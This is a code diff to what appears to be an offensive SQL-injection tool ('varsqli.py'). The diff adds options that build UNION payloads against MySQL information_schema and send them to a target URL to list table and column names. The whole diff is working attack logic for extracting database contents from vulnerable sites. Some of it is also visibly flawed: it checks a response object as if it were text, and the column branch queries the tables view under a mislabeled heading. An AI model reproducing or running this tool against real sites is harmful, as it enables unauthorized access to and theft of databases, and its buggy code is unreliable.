@@ -1,3 +1,4 @@
+# Update
 import requests 
 import datetime
 import time
@@ -81,6 +82,9 @@ parser.add_argument('-u', '--url', dest='url', type=str, help='URL Target (ex : 
 parser.add_argument('--check-vuln', dest='check', action='store_true', help='Check to see if the site is vulnerable')
 parser.add_argument('--check-columns', dest='columns', action='store_true', help='check MYSQL numeric columns')
 parser.add_argument('--dump-dbs', dest='dbs', action='store_true', help='check the user, dbs, version . entries')
+
+parser.add_argument('--tables', dest='tab', action='store_true', help='Show 1 tables Names')
+parser.add_argument('--columns', dest='col', action='store_true', help='Show 1 Columns Names')
 
 parser.add_argument('--dump-tables', dest='tables', action='store_true', help='dump all tables of SQL Injection target')
 parser.add_argument('-T', '--tables-name', dest='name_db', help='DBMS name (Database) to dump tables')
@@ -210,6 +214,47 @@ if URL_TARGET:
 
                             else:
                                 print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")
+
+                            if args.tab:
+                                query = payload_2.replace("2", "table_name")
+                                payload_6 = f"{query} From information_schema.tables"
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
+                                result_6 = requests.get(URL_TARGET, payload_6)
+                                if "The used SELECT" in result_6:
+                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                    exit("Ending {}".format(end_time))
+                                else:
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
+                                    print("")
+                                    print("Database Tables Names MySQL : ")
+                                    print("      Payload : {}".format(payload_6))
+                                    print("")
+                                    print("      URL : {}".format(URL_TARGET))
+                                    print("")
+                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
+                                    print("")
+
+                            if args.col:
+                                query = payload_2.replace("2", "column_name")
+                                payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
+                                result_6 = requests.get(URL_TARGET, payload_6)
+                                if "The used SELECT" in result_6:
+                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                    exit("Ending {}".format(end_time))
+                                else:
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
+                                    print("")
+                                    print("Database Tables Names MySQL : ")
+                                    print("      Payload : {}".format(payload_6))
+                                    print("")
+                                    print("      URL : {}".format(URL_TARGET))
+                                    print("")
+                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
+                                    print("")
+                                        
                             
                             if args.tables:
                                 if args.name_db:
